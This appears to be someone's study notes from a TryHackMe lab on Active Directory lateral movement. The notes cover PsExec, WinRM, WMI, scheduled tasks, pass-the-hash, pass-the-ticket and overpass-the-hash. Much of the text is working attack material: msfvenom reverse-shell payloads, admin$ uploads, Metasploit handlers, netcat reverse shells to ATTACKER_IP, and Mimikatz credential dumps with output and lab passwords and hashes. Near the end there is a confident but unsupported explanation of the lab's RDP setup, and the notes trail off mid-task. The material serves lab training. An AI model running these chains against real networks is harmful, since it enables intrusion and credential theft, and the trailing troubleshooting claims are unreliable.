# Lateral Movement and Pivoting

## Task 1 Introduction

The room teaches lateral movement techniques used by attackers after gaining an initial foothold in an Active Directory (AD) environment. You’ll learn how attackers move between hosts with minimal detection, use alternative authentication materials, and pivot through compromised machines. Completing the Breaching AD and Enumerating AD rooms first is recommended.

### Networking Setup

#### AttackBox

- If using the web-based AttackBox, you’re auto‑connected to the network.
- You must manually configure DNS to resolve AD hostnames:
```
sed -i '1s|^|nameserver $THMDCIP\n|' /etc/resolv-dnsmasq
```
- Test DNS with:
```
nslookup thmdc.za.tryhackme.com
```
- DNS resets every ~3 hours, so you may need to repeat the setup.
- Record your lateralmovement interface IP — this is your attacker IP for reverse shells.

#### Own Machine (OpenVPN)

- Download the VPN config from the access page.
- Connect using:
```
sudo openvpn user-lateralmovementandpivoting.ovpn
```
- After “Initialization Sequence Completed,” verify connection on the access page.
- DNS must still be configured manually.

#### Kali VM

- Use Network Manager GUI to set DNS to the THMDC IP.
- Add a secondary DNS (e.g., 1.1.1.1) for internet access.
- Restart NetworkManager.
- Test DNS by visiting:
```
http://distributor.za.tryhackme.com/creds
```

### Getting Initial Credentials

- Visit the distributor site to obtain your AD username/password.
- These credentials allow SSH access to:
```
thmjmp2.za.tryhackme.com
```
using:
```
ssh za\<username>@thmjmp2.za.tryhackme.com
```
This jump host simulates your initial foothold in the environment.

### Reverse Shell Note
Always use the IP of the lateralmovement interface as your attacker IP for any reverse connections.


## Task 2 Summary: Moving Through the Network

### What Lateral Movement Is

Lateral movement refers to the techniques attackers use to move between systems inside a network after gaining an initial foothold. Attackers do this to:

- Reach their ultimate objectives
- Bypass network segmentation and restrictions
- Create additional access points
- Confuse defenders and reduce detection

Rather than a single step in a kill chain, lateral movement is a repeating cycle:
Gain access → extract credentials → move to a new host → escalate → extract more credentials → repeat.

```
+---------------------------------------------------------------+
|                                                               |
|   [ Initial Recon ] → [ Initial Compromise ] → [ Foothold ]   |
|                                                               |
|                 ↓                 ↓                 ↓          |
|             [ Escalate Privileges ] → [ Internal Recon ]       |
|                                      ↘                        |
|                                       [ Move Laterally ]      |
|                                        ↘                      |
|                                         [ Maintain Presence ] |
|                                          ↘                    |
|                                           [ Complete Mission ]|
|                                                               |
+---------------------------------------------------------------+

Cycle Summary:
---------------------------------------------------------------
1. Initial Recon        → Gather information about the target.
2. Initial Compromise   → Gain first access (e.g., phishing).
3. Establish Foothold   → Deploy persistence or malware.
4. Escalate Privileges  → Gain higher-level access.
5. Internal Recon       → Map internal network and assets.
6. Move Laterally       → Spread to other systems.
7. Maintain Presence    → Ensure continued access.
8. Complete Mission     → Achieve attacker’s goal.
---------------------------------------------------------------
```

Attackers often need several cycles before reaching high‑value systems.


### Example Scenario

A phishing compromise lands the attacker on a Marketing workstation, which is heavily restricted. To reach an internal code repository, the attacker:

1. Elevates privileges on the Marketing PC
2. Extracts local admin hashes
3. Identifies another host: DEV‑001‑PC
4. Uses the reused local admin hash to access DEV‑001‑PC
5. From the developer’s machine, reaches the code repository

Path 1 (successful, stealthy):  
Marketing-PC → DEV-001-PC (using local admin hash) → Code Repo

Path 2 (blocked by firewall):  
Marketing-PC → Firewall → Code Repo / admin services (denied)

Path 3 (conceptual, “too noisy”):  
Marketing-PC → Code Repo directly (would be suspicious in logs even if allowed)
```
                  [ Attacker ]
                      |
                      v
                +----------------+
                |  Marketing-PC  |
                +----------------+
                  /      |      \
                 /       |       \
                v        |        v
      (1) Local Admin    |  (3) Direct to
          Hash reuse     |      Code Repo
                         |
        +----------------+----------------+
        |     Firewall (Marketing rules)  |
        +----------------+----------------+
                         |
          (2) Blocked to Code Repo / Admin
                         v
                   +-----------+
                   | Code Repo |
                   +-----------+


(1) Marketing-PC --------------> DEV-001-PC (via reused local admin hash)
                                  |
                                  v
                             +-----------+
                             | Code Repo |
                             +-----------+
```

Even if Marketing had direct access, using the developer’s machine is less suspicious in audit logs.


### Attacker Techniques

Attackers can move laterally using:

- Standard administrative protocols: WinRM, RDP, VNC, SSH
- More stealthy techniques covered later in the room

They try to mimic realistic user behaviour to avoid detection (e.g., IT staff accessing servers is normal; Marketing PC accessing DEV‑001‑PC is suspicious).


### Administrators & UAC
Two types of admin accounts matter:

- Local admin accounts (on the machine)
- Domain accounts with local admin rights

Key difference: User Account Control (UAC) restricts local admins (except the built‑in Administrator).

- Local admins connecting remotely via RPC/SMB/WinRM receive a filtered medium‑integrity token, blocking privileged actions.
- Domain admins with local admin rights get full privileges remotely.

If a lateral movement technique fails, UAC restrictions on a non‑default local admin may be the reason. 

### Summary of UAC and Remote Restrictions in Windows Vista

#### Purpose of UAC

User Account Control (UAC) in Windows Vista ensures users—even those in the local Administrators group—run most tasks with least‑privilege rights. When an administrative action is required, Vista prompts for approval.

### How Remote Restrictions Work

UAC applies special rules to remote connections to prevent:

- Loopback attacks
- Local malware gaining remote administrative rights

Local Accounts (SAM)

- A local Administrator connecting remotely (e.g., via net use \\computer\share$) does NOT receive full admin rights.
- Their token is filtered, meaning no elevation and no ability to perform admin tasks.
- To administer remotely using a local account, they must log in interactively (Remote Desktop / Remote Assistance).

### Domain Accounts

- Domain users who are Administrators do receive full admin tokens when connecting remotely.
- UAC remote restrictions do not apply to domain accounts.
- This behavior matches Windows XP.

### Disabling UAC Remote Restrictions

Controlled via the registry value:
```
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy
```
- 0 (default): Local admins get a filtered token (no elevation).
- 1: Local admins get an elevated token (full admin rights remotely).
- Setting the value to 1 disables UAC remote restrictions.



## Task 3: Spawning Processes Remotely — Summary + ASCII Diagrams

Attackers with valid credentials can execute commands on remote Windows hosts using several built‑in mechanisms. Each technique uses different protocols and behaves differently, making some methods more stealthy or more reliable depending on the environment.

### 1. PsExec (SMB / Service Execution)

Ports: 445 (SMB)
Required: Local/Domain Administrator
PsExec uploads a temporary service executable, starts it, and communicates through named pipes.

#### ASCII Diagram — PsExec Flow
```
[ Attacker ]                          [ Target ]
      |                                   |
      |-- SMB (445) --------------------->|
      |                                   |
      |  Upload psexesvc.exe to Admin$    |
      |---------------------------------->|
      |                                   |
      |  Create & start PSEXESVC service  |
      |---------------------------------->|
      |                                   |
      |<-- Named Pipe: \\.\pipe\psexesvc --|
      |     stdin / stdout / stderr       |
```
Command example: (MACHINE_IP is PC laterally connecting to)
```
psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
```

### 2. WinRM (Remote PowerShell Execution)

Ports: 5985 (HTTP), 5986 (HTTPS)
Required: Remote Management Users

WinRM allows remote PowerShell sessions or remote script execution.

#### ASCII Diagram — WinRM Flow
```
[ Attacker ] -- WinRM HTTP/HTTPS --> [ Target ]
      |                                   |
      |  Auth via PSCredential            |
      |---------------------------------->|
      |                                   |
      |  Enter-PSSession / Invoke-Command |
      |---------------------------------->|
      |                                   |
      |<----------- Command Output -------|
```
Examples:
```
winrs.exe -u:Administrator -p:Mypass123 -r:TARGET cmd
Enter-PSSession -Computername TARGET -Credential $credential
Invoke-Command -Computername TARGET -Credential $credential -ScriptBlock {whoami}
```
### 3. sc.exe (Remote Service Creation via RPC or SMB Pipes)

Ports:

- 135 (RPC Endpoint Mapper)
- 49152–65535 (Dynamic RPC ports)
- 445 / 139 (SMB Named Pipes)
  Required: Administrators

Windows services can run arbitrary commands when started. sc.exe connects to the Service Control Manager (SVCCTL) using RPC or SMB pipes.

#### ASCII Diagram — RPC → SVCCTL
```
[ Attacker ] -- RPC 135 --> [ Endpoint Mapper ]
      |                         |
      |   "Where is SVCCTL?"    |
      |------------------------>|
      |                         |
      |<-- "SVCCTL at port 50xxx" 
      |
[ Attacker ] -- RPC 50xxx --> [ SVCCTL ]
      |                         |
      |  Create / Start Service |
      |------------------------>|
```

#### ASCII Diagram — SMB Named Pipe Fallback
```
[ Attacker ] -- SMB (445/139) --> [ Target ]
      |                                 |
      | Bind to \\pipe\svcctl            |
      |--------------------------------->|
      | Create / Start Service           |
```

Example:
```
sc.exe \\TARGET create THMservice binPath= "net user munra Pass123 /add" start= auto
sc.exe \\TARGET start THMservice
```

### 4. schtasks (Remote Scheduled Task Execution)

Scheduled tasks can run commands remotely under SYSTEM.

#### ASCII Diagram — Scheduled Task Execution
```
[ Attacker ] -- schtasks --> [ Target ]
      |                           |
      | Create THMtask1 (SYSTEM)  |
      |-------------------------->|
      |                           |
      | Run task manually         |
      |-------------------------->|
      |                           |
      |<-- No output (blind exec) |
```

Example:
```
schtasks /s TARGET /RU "SYSTEM" /create /tn "THMtask1" /tr "<payload>" /sc ONCE
schtasks /s TARGET /run /TN "THMtask1"
```

### Putting It All Together — Full Attack Chain (Exercise)

1. Generate a service‑safe reverse shell payload ():
```
msfvenom -p windows/shell/reverse_tcp -f exe-service \
LHOST=ATTACKER_IP LPORT=4444 -o myservice.exe
```
2. Upload payload to THMIIS Admin$ share (PC we laterally move to):
```
smbclient -c 'put myservice.exe' -U t1_leonard.summers -W ZA \
'//thmiis.za.tryhackme.com/admin$/' EZpass4ever
```
3. Start listener (try with and without \ for next line if fails):
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; \
set LHOST lateralmovement; set LPORT 4444; exploit"
```
4. Use runas (/netonly) to spawn a second reverse shell with the stolen token:
```
runas /netonly /user:ZA.TRYHACKME.COM\t1_leonard.summers \
"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4443"
```
5. Receive shell:
```
nc -lvp 4443
```
6. Create remote service pointing to uploaded payload (the persistence element keep shell open):
```
sc.exe \\thmiis.za.tryhackme.com create THMservice-3249 binPath= "%windir%\myservice.exe" start= auto
sc.exe \\thmiis.za.tryhackme.com start THMservice-3249
```
7. Reverse shell fires → access THMIIS → run flag.exe. 


## Task 4: Moving Laterally Using WMI

### What WMI Is

Windows Management Instrumentation (WMI) is Microsoft’s implementation of WBEM, allowing administrators to remotely manage systems.
Attackers abuse WMI for lateral movement, remote process execution, service creation, scheduled tasks, and MSI installation.

### How to Connect to WMI (PowerShell)

1. Create PSCredential object

```
$username = 'Administrator'
$password = 'Mypass123'
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
```

2. Choose protocol

- DCOM → RPC (ports 135 + 49152–65535)
- WSMAN → WinRM (ports 5985/5986)

3. Create WMI session

```
$Opt = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName TARGET -Credential $credential -SessionOption $Opt -ErrorAction Stop
```

### Remote Process Creation (WMI)

PowerShell
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{
    CommandLine = "powershell.exe -Command Set-Content -Path C:\text.txt -Value munrawashere"
}
```
Legacy WMIC
```
wmic.exe /user:Administrator /password:Mypass123 /node:TARGET process call create "cmd.exe /c calc.exe"
```
WMI does not return command output — it silently spawns the process.

### Remote Service Creation (WMI)

Create service
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Service -MethodName Create -Arguments @{
    Name = "THMService2"
    DisplayName = "THMService2"
    PathName = "net user munra2 Pass123 /add"
    ServiceType = [byte]::Parse("16")
    StartMode = "Manual"
}
```

Start service
```
$Service = Get-CimInstance -CimSession $Session -ClassName Win32_Service -filter "Name LIKE 'THMService2'"
Invoke-CimMethod -InputObject $Service -MethodName StartService
```

Stop + delete
```
Invoke-CimMethod -InputObject $Service -MethodName StopService
Invoke-CimMethod -InputObject $Service -MethodName Delete
```

### Remote Scheduled Task Creation (WMI)
```
$Command = "cmd.exe"
$Args = "/c net user munra22 aSdf1234 /add"

$Action = New-ScheduledTaskAction -CimSession $Session -Execute $Command -Argument $Args
Register-ScheduledTask -CimSession $Session -Action $Action -User "NT AUTHORITY\SYSTEM" -TaskName "THMtask2"
Start-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

Delete task:
```
Unregister-ScheduledTask -CimSession $Session -TaskName "THMtask2"
```

###  Installing MSI Packages via WMI

If you copy an MSI to the target (e.g., via SMB to ADMIN$ → C:\Windows\):

PowerShell
```
Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{
    PackageLocation = "C:\Windows\myinstaller.msi"
    Options = ""
    AllUsers = $false
}
```

On Legacy WMIC
```
wmic /node:TARGET /user:DOMAIN\USER product call install PackageLocation=c:\Windows\myinstaller.msi
```
This is used to execute a reverse shell MSI payload.

### TryHackMe Task Flow (Your Exercise)

- SSH into THMJMP2 using your AD credentials.
- Use the provided admin creds:
  - User: ZA.TRYHACKME.COM\t1_corine.waters
  - Pass: Korine.1994
- Create MSI payload with msfvenom on AttackBox.
  ```
  user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=lateralmovement LPORT=4445 -f msi > myinstaller.msi
  ```
- Upload MSI to THMIIS via SMB → goes to C:\Windows\.
  ```
  user@AttackBox$ smbclient -c 'put myinstaller.msi' -U t1_corine.waters -W ZA '//thmiis.za.tryhackme.com/admin$/' Korine.1994
  ```
- Start Metasploit handler.
  ```
  msf6 exploit(multi/handler) > set LHOST lateralmovement
  msf6 exploit(multi/handler) > set LPORT 4445
  msf6 exploit(multi/handler) > set payload windows/x64/shell_reverse_tcp
  msf6 exploit(multi/handler) > exploit

  [*] Started reverse TCP handler on 10.10.10.16:4445
  ```
- Create WMI session from THMJMP2.
  1. First ssh za\\<AD Username>@thmjmp2.za.tryhackme.com using creds from ../cred page in task 1.  
  2. run powershell
  3. run the following
     ```
     PS C:\> $username = 't1_corine.waters';
     PS C:\> $password = 'Korine.1994';
     PS C:\> $securePassword = ConvertTo-SecureString $password -AsPlainText -Force;
     PS C:\> $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
     PS C:\> $Opt = New-CimSessionOption -Protocol DCOM
     PS C:\> $Session = New-Cimsession -ComputerName thmiis.za.tryhackme.com -Credential $credential -SessionOption $Opt -ErrorAction Stop
     ```
- Invoke MSI installation via WMI → triggers reverse shell.
  ```
  PS C:\> Invoke-CimMethod -CimSession $Session -ClassName Win32_Product -MethodName Install -Arguments @{PackageLocation =   "C:\Windows\myinstaller.msi"; Options = ""; AllUsers = $false}
  ```
- On THMIIS reverse shell, run flag.exe on t1_corine.waters desktop.
```
[*] Started reverse TCP handler on 10.150.74.7:4445 
[*] Command shell session 1 opened (10.150.74.7:4445 -> 10.200.74.201:60504) at 2026-07-05 15:56:03 +1000


Shell Banner:
Microsoft Windows [Version 10.0.17763.1098]
-----
          

C:\Windows\system32>cd "c:\users\t1_corine.waters\desktop"
cd "c:\users\t1_corine.waters\desktop
...
2022/06/17  18:52            58�368 Flag.exe
2026/07/05  04:51                66 flag_output.txt
...
# Text file is nothing of interest
c:\Users\t1_corine.waters\Desktop>type flag_output.txt
type flag_output.txt
Sorry! You are still missing something. No flag for you yet. (1)

c:\Users\t1_corine.waters\Desktop>flag.exe
flag.exe
THM{MOVING_WITH_WMI_4_FUN}


c:\Users\t1_corine.waters\Desktop>
```  
- Submit the flag.

## Task 5: Alternate Authentication Material & Pass‑the‑Hash

Alternate authentication material refers to anything that lets you authenticate as a Windows user without knowing their password. This is possible because Windows authentication protocols (NTLM and Kerberos) rely on reusable cryptographic material such as password hashes or tickets.

This section focuses on NTLM authentication and how attackers use NTLM hashes to authenticate as a user — a technique known as Pass‑the‑Hash (PtH).

### How NTLM Authentication Works

NTLM is a challenge‑response protocol:
```
+-----------+                 +-----------+                 +-------------------+
|   Client  |                 |   Server  |                 | Domain Controller |
+-----------+                 +-----------+                 +-------------------+
     |                              |                                |
     |----(1) Authentication Req --->|                                |
     |                              |                                |
     |<---(2) NTLM Challenge --------|                                |
     |                              |                                |
     |----(3) NTLM Response -------->|                                |
     |                              |                                |
     |                              |----(4) Send Challenge & Resp -->|
     |                              |                                |
     |                              |<---(5) Allow / Deny Auth -------|
     |<---(6) Allow / Deny Auth ----|                                |
     |                              |                                |
     +---------------------------------------------------------------+
```

- 1. Client requests authentication.
- 2. Server sends a random challenge.
- 3. Client uses NTLM password hash + challenge to compute a response.
- 4. Server sends challenge + response to the Domain Controller.
- 5. DC recomputes the response using the stored NTLM hash.
- 6. If they match → authentication succeeds.

Key point:  

The NTLM hash itself is enough to compute the correct response.
You do not need the plaintext password.

### Pass‑the‑Hash (PtH)

If you extract NTLM hashes from a machine, you can authenticate as that user without cracking the hash.

PtH works because NTLM authentication only needs the hash, not the password.

#### How attackers obtain NTLM hashes:

1. Local SAM dump (local accounts only)
2. LSASS memory dump (local + domain accounts that logged in recently)

Example Mimikatz commands:

local Sam dump first:
```
privilege::debug
token::elevate
lsadump::sam

# Example output
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # lsadump::sam   
RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 145e02c50333951f71d13c245d352b50

```
LSASS memory dump
```
sekurlsa::msv

# Example of output
mimikatz # privilege::debug
mimikatz # token::elevate

mimikatz # sekurlsa::msv 
Authentication Id : 0 ; 308124 (00000000:0004b39c)
Session           : RemoteInteractive from 2 
User Name         : bob.jenkins
Domain            : ZA
Logon Server      : THMDC
Logon Time        : 2022/04/22 09:55:02
SID               : S-1-5-21-3330634377-1326264276-632209373-4605
        msv :
         [00000003] Primary
         * Username : bob.jenkins
         * Domain   : ZA
         * NTLM     : 6b4a57f67805a663c818106dc0648484

```

### Using PtH with Mimikatz

Mimikatz can inject a token using a stolen NTLM hash:
```
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:"<command>"

# Example output
mimikatz # token::revert
mimikatz # sekurlsa::pth /user:bob.jenkins /domain:za.tryhackme.com /ntlm:6b4a57f67805a663c818106dc0648484 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5555"
```

Notice we used token::revert to reestablish our original token privileges, as trying to pass-the-hash with an elevated token won't work. 

This would be the equivalent of using runas /netonly but with a hash instead of a password and will spawn a new reverse shell from where we can launch any command as the victim user.

To receive the reverse shell, we should run a reverse listener on our AttackBox:

AttackBox

- user@AttackBox$ nc -lvp 5555

Interestingly, if you run the whoami command on this shell, it will still show you the original user you were using before doing PtH, but any command run from here will actually use the credentials we injected using PtH.

This launches a process (e.g., reverse shell) authenticated as the victim user.


### PtH from Linux

Several tools support NTLM hash authentication:

RDP
```
xfreerdp /v:<IP> /u:<DOMAIN\User> /pth:<NTLM_HASH>
```
PsExec (Linux version only)
```
psexec.py -hashes <NTLM_HASH> <DOMAIN>/<User>@<IP>
```
WinRM
```
evil-winrm -i <IP> -u <User> -H <NTLM_HASH>
```
These allow full remote access using only the NTLM hash.

### Core Takeaway

NTLM hashes are authentication material.
If NTLM authentication is enabled, you can authenticate as a user without knowing their password — simply by possessing their NTLM hash.

This is the foundation of Pass‑the‑Hash, a major lateral movement technique in Windows networks.


### Kerberos Authentication Overview

Kerberos allows secure authentication on Windows networks using encrypted tickets rather than repeatedly sending passwords.

#### 1. Requesting a Ticket Granting Ticket (TGT)

The client sends its username and a timestamp encrypted with a key derived from its password to the Key Distribution Center (KDC) on the Domain Controller.

If valid, the KDC responds with a Ticket Granting Ticket (TGT) and a Session Key.
The TGT is encrypted using the krbtgt account’s hash, so the user cannot read it.

ASCII Diagram — Kerberos Get TGT
```
+-----------+                     +-----------------------+
|   Client  |                     |  KDC (Domain Ctrlr)   |
+-----------+                     +-----------------------+
| User Hash |                     | krbtgt Hash | User Hash |
     |                                      |
     |----(1) Request TGT------------------->|
     |   [Username + Timestamp (enc)]        |
     |<---(2) Response-----------------------|
     |   [TGT (enc w/ krbtgt hash)]          |
     |   [Session Key]                       |
     +---------------------------------------+
```

#### 2. Requesting a Ticket Granting Service (TGS)

When the user wants to access a network service (e.g., MSSQL, file share, web app), they use the TGT to ask the KDC for a TGS.

The request includes:
- Username and timestamp (encrypted with the Session Key)
- The TGT
- The Service Principal Name (SPN) identifying the target service

The KDC responds with:
- A TGS (encrypted with the service owner’s hash)
- A Service Session Key

ASCII Diagram — Kerberos Get TGS
```
+-----------+                     +-----------------------+
|   Client  |                     |  KDC (Domain Ctrlr)   |
+-----------+                     +-----------------------+
| Session Key | TGT |             | krbtgt Hash | Svc Owner Hash |
     |                                      |
     |----(3) Request TGS------------------->|
     |   [Username + Timestamp (enc w/ SessKey)] |
     |   [TGT] [SPN = MSSQL/SRV]             |
     |<---(4) Response-----------------------|
     |   [TGS (enc w/ Svc Owner Hash)]       |
     |   [Svc Session Key]                   |
     +---------------------------------------+
```

#### 3. Authenticating to the Service

The client sends the TGS to the target service.
The service decrypts it using its own account’s password hash, retrieves the Service Session Key, and validates the connection.

Once verified, the client can access the service securely without ever sending its password again.

ASCII Diagram — Kerberos Authenticate
```
+-----------+                     +-----------------------+
|   Client  |                     |     Service Server    |
+-----------+                     +-----------------------+
| TGS | Svc Session Key |         | Service Owner Hash    |
     |                                      |
     |----(5) Send TGS--------------------->|
     |   [Authenticate using Svc Session Key]|
     |<---(6) Access Granted----------------|
     +--------------------------------------+
```

### Key Takeaways

- Kerberos uses tickets instead of passwords for authentication.
- The TGT allows requesting service tickets without resending credentials.
- The TGS is specific to one service and encrypted with that service’s account hash.
- The Session Keys ensure secure communication between client, KDC, and service.

### Pass‑the‑Ticket (PtT)

Concept:  

Kerberos tickets (TGTs or TGSs) and their session keys can be extracted from LSASS memory using Mimikatz when you have SYSTEM privileges.

Commands:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
```

Key points:
- Both the ticket and its session key are required to reuse it.
- TGTs are most valuable (allow access to any service the user can reach).
- TGSs are service‑specific and can be extracted by low‑privileged users.
- Injecting a ticket into your session doesn’t need admin rights:

```
mimikatz # kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-ZA.TRYHACKME.COM.kirbi
```

Once injected, tools like klist confirm cached tickets and allow lateral movement.
```
za\bob.jenkins@THMJMP2 C:\> klist

Current LogonId is 0:0x1e43562

Cached Tickets: (1)

#0>     Client: Administrator @ ZA.TRYHACKME.COM
        Server: krbtgt/ZA.TRYHACKME.COM @ ZA.TRYHACKME.COM
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 4/12/2022 0:28:35 (local)
        End Time:   4/12/2022 10:28:35 (local)
        Renew Time: 4/23/2022 0:28:35 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: THMDC.za.tryhackme.com
```

### Overpass‑the‑Hash / Pass‑the‑Key (OPtH / PtK)
Concept:  
Kerberos authentication uses encryption keys derived from passwords (DES, RC4, AES128, AES256).
If you have one of these keys, you can request a TGT without knowing the password.

Commands to extract keys:
```
mimikatz # privilege::debug
mimikatz # sekurlsa::ekeys
```

Using keys for remote shell (examples):
- RC4 key (same as NTLM hash):
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /rc4:96ea24eff4dff1fbe13818fbf12ea7d8 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

AES128 key:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes128:b65ea8151f13a31d01377f5934bf3883 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

AES256 key:
```
mimikatz # sekurlsa::pth /user:Administrator /domain:za.tryhackme.com /aes256:b54259bbff03af8d37a138c375e29254a2ca0649337cc4c73addcd696b4cdb65 /run:"c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 5556"
```

Listener on AttackBox:
```
nc -lvp 5556
```

Notes:

- RC4 = NTLM hash → enables Overpass‑the‑Hash variant.
- Commands executed from the injected shell use the impersonated Kerberos credentials.

### Summary Table
Technique	         Protocol	      Required Privilege	    Extracted Material	  Purpose
Pass‑the‑Ticket	   Kerberos	      SYSTEM (for LSASS dump)	TGT/TGS + Session Key	Reuse valid Kerberos tickets
Pass‑the‑Key	     Kerberos	      SYSTEM (for LSASS dump)	AES/RC4 key	          Request new TGT without password
Overpass‑the‑Hash	 Kerberos (RC4)	SYSTEM	                NTLM hash	            Use NTLM hash as Kerberos key


### Final Task – Lateral Movement to THMIIS

### 1. Connect to THMJMP2 (Jump Host)

Use SSH with the provided domain credentials:
```
User: ZA.TRYHACKME.COM\t2_felicia.dean

Password: iLov3THM!

ssh za\\t2_felicia.dean@thmjmp2.za.tryhackme.com
```
This account has administrator privileges on THMJMP2, allowing full use of Mimikatz.


#### 2. Extract Authentication Material with Mimikatz

From THMJMP2, dump credentials from LSASS:

- NTLM hashes → Pass‑the‑Hash
- Kerberos tickets → Pass‑the‑Ticket
- Kerberos keys (RC4/AES) → Pass‑the‑Key / Overpass‑the‑Hash

Tools available at:
```
C:\tools\mimikatz.exe
C:\tools\psexec64.exe
```
#### First LSASS NTLM Hashes
```
za\t2_felicia.dean@THMJMP2 c:\tools>mimikatz.exe                            
                                                                            
  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08                
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)                                 
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )    
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz                     
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )   
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/   
                                                                            
mimikatz # privilege::debug                                                 
Privilege '20' OK                                                           
                                                                            
mimikatz # token::elevate                                                   
Token Id  : 0                                                               
User name :                                                                 
SID name  : NT AUTHORITY\SYSTEM                                             
                                                                            
504     {0;000003e7} 1 D 16809          NT AUTHORITY\SYSTEM     S-1-5-18    
(04g,21p)       Primary                                                     
 -> Impersonated !                                                          
 * Process Token : {0;0020bc77} 0 D 2226945     ZA\t2_felicia.dean      S-1-
5-21-3330634377-1326264276-632209373-4605       (12g,24p)       Primary     
 * Thread Token  : {0;000003e7} 1 D 2283232     NT AUTHORITY\SYSTEM     S-1-
5-18    (04g,21p)       Impersonation (Delegation)                          
                                                                            
mimikatz # lsadump::sam                                                     
Domain : THMJMP2                                                            
SysKey : 2e27b23479e1fb1161a839f9800119eb                                   
Local SID : S-1-5-21-1946626518-647761240-1897539217                        
                                                                            
SAMKey : 9a74a253f756d6b012b7ee3d0436f77a                                   
                                                                            
RID  : 000001f4 (500)                                                       
User : Administrator                                                        
  Hash NTLM: 0b2571be7e75e3dbd169ca5352a2dad7                               
                                                                            
RID  : 000001f5 (501)                                                       
User : Guest                                                                
                                                                            
RID  : 000001f7 (503)                                                       
User : DefaultAccount                                                       
```
The use one of the RDP options to use the has such as:
```
xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```
#Did not seem to work, asks for accepting something like
```
xfreerdp /v:THMJMP2.za.tryhackme.com /u:ZA\Administrator /pth:0b2571be7e75e3dbd169ca5352a2dad7
```

All seem to fail same way.
```
Do you trust the above certificate? (Y/T/N) [03:10:03:742] [539592:00083bca] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[03:10:03:743] [539592:00083bca] [ERROR][com.winpr.sspi.Kerberos] - [kerberos_AcquireCredentialsHandleA]: krb5_parse_name (Configuration file does not specify default realm [-1765328160])
[03:10:05:896] [539592:00083bca] [ERROR][com.freerdp.core] - [nla_recv_pdu]: ERRCONNECT_LOGON_FAILURE [0x00020014]
[03:10:05:896] [539592:00083bca] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x5596eb3daf70]: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[03:10:05:896] [539592:00083bca] [ERROR][com.freerdp.core.rdp] - [rdp_recv_callback_int][0x5596eb3daf70]: CONNECTION_STATE_NLA status STATE_RUN_FAILED [-1]
[03:10:05:896] [539592:00083bca] [ERROR][com.freerdp.core.transport] - [transport_check_fds]: transport_check_fds: transport->ReceiveCallback() - STATE_RUN_FAILED [-1]
[03:10:05:903] [539592:00083bc8] [WARN][com.winpr.negotiate] - [negotiate_FreeCredentialsHandle]: FreeCredentialsHandle returned SEC_E_INVALID_HANDLE
[03:10:05:903] [539592:00083bc8] [WARN][com.winpr.negotiate] - [negotiate_FreeCredentialsHandle]: FreeCredentialsHandle returned SEC_E_INVALID_HANDLE
```
Retry but this clarified issue is rdp on thmjmp2 is not working:

The new error:

```
BIO_read returned a system error 104: Connection reset by peer
ERRCONNECT_CONNECT_TRANSPORT_FAILED [0x0002000D]
```
means something very different:

#### The RDP service on THMJMP2 is rejecting the connection before authentication.
This is not a Pass‑the‑Hash problem anymore.
This is network‑layer refusal.

Let’s break down exactly why this happens in TryHackMe AD rooms and how to confirm it.

#### Why THMJMP2 rejects RDP connections
TryHackMe’s Lateral Movement & Pivoting room has this behaviour:

✔ THMJMP2 does NOT allow RDP logins
✔ Only WinRM (WinRS) and SMB are enabled
✔ RDP is intentionally disabled to force you to use Kerberos or WinRS
✔ The room’s instructions never mention RDP access to THMJMP2
✔ The room’s intended RDP target is THMIIS, not THMJMP2

#### Next Kerberos tickets → Pass‑the‑Ticket

Mimikatz exports every Kerberos ticket LSASS has seen:
- TGTs (Ticket Granting Tickets)
- TGSs (Service Tickets)
- Tickets for SYSTEM
- Tickets for services running under machine accounts
- Tickets for other logged‑in users
- Tickets for background processes
- Tickets for scheduled tasks
- Tickets for cached sessions

This is why you see a huge list.

But only ONE type matters for lateral movement:

**You want the TGT for the user you are attacking**
- In this room: t1_toby.beck
- Appears t1_tony.beck hash. Many replica response and variations recorded here are the main two examples found, Tony no hash, but simon and felicia did.

```
mimikatz # privilege::debug                                                 
Privilege '20' OK                                                           

mimikatz # sekurlsa::tickets /export
```
Files exported are in directory unless otherwise stated from securlsa
